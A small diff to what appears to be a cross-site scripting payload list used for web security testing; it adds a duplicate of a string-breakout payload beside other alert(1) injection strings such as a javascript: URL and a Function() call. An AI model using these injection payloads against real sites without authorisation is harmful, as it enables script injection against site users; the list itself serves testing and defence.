@@ -72,4 +72,5 @@ javascript:void(alert(1))
 ";Function('alert(1)')()//
 '+(alert(1))+'
 \"-alert(1)}//
+\"-alert(1)}//
 
